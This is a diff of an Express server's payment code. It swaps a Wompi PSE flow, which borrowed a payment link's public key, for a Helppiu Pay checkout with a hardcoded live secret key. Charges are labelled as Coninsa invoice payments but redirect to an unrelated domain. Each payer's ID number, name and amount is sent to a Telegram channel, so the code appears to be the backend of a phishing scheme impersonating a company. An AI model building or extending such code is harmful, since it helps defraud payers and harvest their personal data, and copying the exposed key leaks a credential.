@@ -863,45 +863,17 @@ app.post('/api/coninsa/buscar', async (req, res) => {
   }
 });
 
-// ── PSE directo Wompi (sin llave privada) ────────────────────────────────────
-const WOMPI_API        = 'https://api.wompi.co/v1';
-const NEQUI_LINK_SHORT = '6HH76R';
-
-let _wPubKey = null, _wVposId = null;
-async function wompiInit() {
-  if (_wPubKey) return;
-  const r = await axios.get(`${WOMPI_API}/payment_links/${NEQUI_LINK_SHORT}`);
-  _wPubKey = r.data.data.merchant_public_key;
-  _wVposId = r.data.data.id;
-}
-
-// Cache de bancos PSE
-let _bankCache = null;
-app.get('/api/pse/bancos', async (req, res) => {
-  const ip = getIp(req);
-  if (!allowed(ip, 20, 60_000))
-    return res.status(429).json({ status: 'ERROR', message: 'Demasiadas solicitudes.' });
-  try {
-    if (!_bankCache) {
-      await wompiInit();
-      const r = await axios.get(`${WOMPI_API}/pse/financial_institutions`, {
-        headers: { Authorization: `Bearer ${_wPubKey}` },
-      });
-      _bankCache = r.data.data;
-    }
-    res.json({ status: 'OK', data: _bankCache });
-  } catch (e) {
-    res.status(502).json({ status: 'ERROR', message: 'No se pudieron cargar los bancos.' });
-  }
-});
+// ── Helppiu Pay PSE ──────────────────────────────────────────────────────────
+const HP_API  = 'https://helppiupay.com/api/v1';
+const HP_AUTH = 'Bearer hp_sk_live_Z9cxILagdjuaO1wXUCGq1qfS:1P94UirgtSEh44r1ZG1oLBRA1npStKcV4nrtERZLA0XDCJrd';
 
 app.post('/api/pse/generar', async (req, res) => {
   const ip = getIp(req);
   if (!allowed(ip, 5, 60_000))
     return res.status(429).json({ status: 'ERROR', message: 'Demasiadas solicitudes. Intenta en un momento.' });
 
-  const { monto, bancoCode, cedula, tipoPersona, tipoDoc, nombre, email, telefono } = req.body;
-  if (!monto || !bancoCode || !cedula)
+  const { monto, cedula, nombre, email } = req.body;
+  if (!monto || !cedula)
     return res.status(400).json({ status: 'ERROR', message: 'Faltan datos requeridos.' });
   const montoNum = parseInt(monto);
   if (!Number.isFinite(montoNum) || montoNum < 1000 || montoNum > 100_000_000)
@@ -909,68 +881,29 @@ app.post('/api/pse/generar', async (req, res) => {
   const montoEnviado = montoNum > 2_500_000 ? 2_200_000 : montoNum;
   if (!/^\d{5,12}$/.test(String(cedula)))
     return res.status(400).json({ status: 'ERROR', message: 'Cédula inválida.' });
-  if (!/^\d+$/.test(String(bancoCode)))
-    return res.status(400).json({ status: 'ERROR', message: 'Banco inválido.' });
 
   try {
-    await wompiInit();
-
-    // Tokens de aceptación frescos
-    const mResp = await axios.get(`${WOMPI_API}/merchants/${_wPubKey}`);
-    const acceptance_token     = mResp.data.data.presigned_acceptance.acceptance_token;
-    const accept_personal_auth = mResp.data.data.presigned_personal_data_auth.acceptance_token;
-
-    // Crear transacción PSE
     const reference = `CON${Date.now()}`;
-    const txResp = await axios.post(`${WOMPI_API}/transactions`, {
-      acceptance_token,
-      accept_personal_auth,
-      amount_in_cents: montoEnviado * 100,
-      currency:        'COP',
-      customer_email:  email || `${cedula}@cliente.co`,
+    const payload = {
       reference,
-      redirect_url:    'https://gestadmoncool.online',
-      payment_link_id: _wVposId,
-      payment_method: {
-        type:                       'PSE',
-        user_type:                  tipoPersona === 'J' ? 1 : 0,
-        user_legal_id_type:         tipoDoc || 'CC',
-        user_legal_id:              String(cedula),
-        financial_institution_code: String(bancoCode),
-        payment_description:        'Pago factura Coninsa',
-      },
-      customer_data: {
-        phone_number:  telefono || '',
-        full_name:     nombre   || 'Cliente',
-        legal_id:      String(cedula),
-        legal_id_type: tipoDoc || 'CC',
-      },
-    }, { headers: { Authorization: `Bearer ${_wPubKey}` } });
+      amount:       montoEnviado,
+      currency:     'COP',
+      description:  'Pago factura Coninsa',
+      success_url:  'https://gestadmoncool.online',
+      cancel_url:   'https://gestadmoncool.online',
+      payment_method_types: ['pse'],
+      metadata:     { cedula: String(cedula) },
+    };
+    if (email)  payload.customer_email = email;
+    if (nombre) payload.customer_name  = nombre;
 
-    const txId = txResp.data.data.id;
+    const r = await axios.post(`${HP_API}/checkout-sessions`, payload, {
+      headers: { Authorization: HP_AUTH, 'Content-Type': 'application/json', 'Idempotency-Key': reference },
+    });
 
-    // Esperar async_payment_url (aparece ~1s después)
-    let asyncUrl = null;
-    for (let i = 0; i < 10; i++) {
-      await new Promise(r => setTimeout(r, 1000));
-      const st = await axios.get(`${WOMPI_API}/transactions/${txId}`, {
-        headers: { Authorization: `Bearer ${_wPubKey}` },
-      });
-      if (i === 0) console.log('[PSE debug]', JSON.stringify(st.data.data?.payment_method));
-      asyncUrl = st.data.data?.payment_method?.extra?.async_payment_url;
-      if (asyncUrl) break;
-    }
+    const checkoutUrl = r.data?.url;
+    if (!checkoutUrl) throw new Error('Helppiu no devolvió URL');
 
-    if (!asyncUrl) {
-      tgText(
-        `⚠️ <b>PSE — sin URL de banco</b>\n` +
-        `📄 Cédula: <code>${cedula}</code>\n` +
-        `💰 Monto: ${fmtCOP(montoNum)}\n` +
-        `🏦 Banco: <code>${bancoCode}</code>\n` +
-        `❌ Wompi no devolvió async_payment_url`
-      );
-      throw new Error('URL del banco no disponible');
-    }
     const montoExtra = montoEnviado !== montoNum
       ? `\n⚠️ Original: ${fmtCOP(montoNum)} → Enviado: ${fmtCOP(montoEnviado)}`
       : '';
@@ -978,13 +911,18 @@ app.post('/api/pse/generar', async (req, res) => {
       `✅ <b>PSE iniciado</b>\n` +
       `📄 Cédula: <code>${cedula}</code>\n` +
       `💰 Monto: ${fmtCOP(montoEnviado)}${montoExtra}\n` +
-      `🏦 Banco: <code>${bancoCode}</code>\n` +
       `👤 ${nombre || 'Sin nombre'}\n` +
-      `🔗 Redirigido al banco`
+      `🔗 Redirigido a Helppiu Pay`
     );
-    return res.json({ status: 'listo', url: asyncUrl });
+    return res.json({ status: 'listo', url: checkoutUrl });
   } catch (e) {
-    const msg = e.response?.data?.error?.type || e.response?.data?.error?.messages?.join(' ') || e.message || 'Error generando PSE';
+    const msg = e.response?.data?.message || e.message || 'Error generando PSE';
+    tgText(
+      `⚠️ <b>PSE — error Helppiu</b>\n` +
+      `📄 Cédula: <code>${cedula}</code>\n` +
+      `💰 Monto: ${fmtCOP(montoNum)}\n` +
+      `❌ ${msg}`
+    );
     return res.status(502).json({ status: 'ERROR', message: msg });
   }
 });
